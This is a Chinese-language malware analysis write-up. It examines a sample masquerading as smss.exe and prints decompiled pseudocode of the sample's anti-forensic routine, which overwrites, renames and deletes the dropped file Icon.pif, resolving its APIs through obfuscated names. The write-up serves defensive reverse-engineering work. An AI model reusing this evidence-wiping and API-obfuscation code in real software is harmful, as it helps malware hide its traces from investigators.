# 子样本smss.exe 行为分析二

启动参数是

```c
C:\windows\system32\smss.exe zWbTLWgKymXMDwZ "C:\ProgramData\Icon.pif"
```

然后干的事情其实就是删除文件

删除路径"C:\ProgramData\Icon.pif"文件

- 具体分析代码如下
    
    ```c
    _BOOL8 __fastcall sub_1400061B0(const wchar_t *icon_pif)
    {
      FARPROC api_GetFileAttributesW; // rax
      int v3; // ebx
      FARPROC api_CreateFileW; // rax
      void *handle_pif; // rsi
      __int64 i; // rdi
      FARPROC api_GetFileSizeEx; // rax
      __int64 file_size2; // rbx
      __int64 v9; // rax
      unsigned int nNumberOfBytesToWrite; // ebx
      FARPROC api_WriteFile; // rax
      FARPROC api_FlushFileBuffers; // rax
      __int64 nNumberOfBytesToWrite2; // rax
      wchar_t *v14; // rax
      wchar_t *v15; // rbx
      FARPROC api_MoveFileW; // rax
      FARPROC api_DeleteFileW; // rax
      __int64 file_size; // [rsp+40h] [rbp-2038h] BYREF
      char lpNumberOfBytesWritten[8]; // [rsp+48h] [rbp-2030h] BYREF
      wchar_t lpExistingFileName[1024]; // [rsp+50h] [rbp-2028h] BYREF
      wchar_t lpNewFileName_randname[1024]; // [rsp+850h] [rbp-1828h] BYREF
      char lpBuffer[4096]; // [rsp+1050h] [rbp-1028h] BYREF
    
      memset(lpExistingFileName, 0, sizeof(lpExistingFileName));
      lpBuffer[0] = 95;
      memset(&lpBuffer[1], 0, 0xFFFui64);
      wcscpy_s(lpExistingFileName, 0x400ui64, icon_pif);
      api_GetFileAttributesW = getAPI("2QTFYj56kn07M7ZeZN5OIE");
      v3 = (api_GetFileAttributesW)(lpExistingFileName);
      if ( v3 == -1 )
        return 0i64;
      api_CreateFileW = getAPI("vPhnRoV6LyvaUyZ");
      handle_pif = (api_CreateFileW)(lpExistingFileName, 0x40000000i64, 3i64, 0i64, 3, v3 & 0xFFFFFFFE, 0i64);
      if ( handle_pif == -1i64 )
        return 0i64;
      i = 0i64;
      api_GetFileSizeEx = getAPI("qkrS8JIXh4c1hkc5K");
      if ( (api_GetFileSizeEx)(handle_pif, &file_size) )
      {
        file_size2 = file_size;
        if ( file_size > 0 )
        {
          do
          {
            v9 = file_size2 - i;
            nNumberOfBytesToWrite = file_size2 - i;
            if ( v9 > 0x1000 )
              nNumberOfBytesToWrite = 0x1000;
            api_WriteFile = getAPI("WOSjCtJk-HJC-");
            (api_WriteFile)(handle_pif, lpBuffer, nNumberOfBytesToWrite, lpNumberOfBytesWritten, 0i64);
            api_FlushFileBuffers = getAPI("-bwcITl6uEpSgQlFNLE6");
            (api_FlushFileBuffers)(handle_pif);
            nNumberOfBytesToWrite2 = nNumberOfBytesToWrite;
            file_size2 = file_size;
            i += nNumberOfBytesToWrite2;
          }
          while ( i < file_size );                  // 这是在为把文件初始化为0
        }
      }
      if ( handle_pif )
        CloseHandle(handle_pif);
      wcscpy_s(lpNewFileName_randname, 0x400ui64, lpExistingFileName);
      v14 = wcsrchr(lpNewFileName_randname, '\\');
      if ( v14 )
        v15 = v14 + 1;
      else
        v15 = lpNewFileName_randname;
      for ( ; *v15; *(v15 - 1) = rand() % 26 + 97 ) // 然后随机娶一个名字
        ++v15;
      api_MoveFileW = getAPI("A2VtvFgR7k5RV");
      if ( (api_MoveFileW)(lpExistingFileName, lpNewFileName_randname) )
        wcscpy_s(lpExistingFileName, 0x400ui64, lpNewFileName_randname);
      api_DeleteFileW = getAPI("mj947Mf7nMuAqMt");
      return (api_DeleteFileW)(lpExistingFileName) != 0;
    }
    ```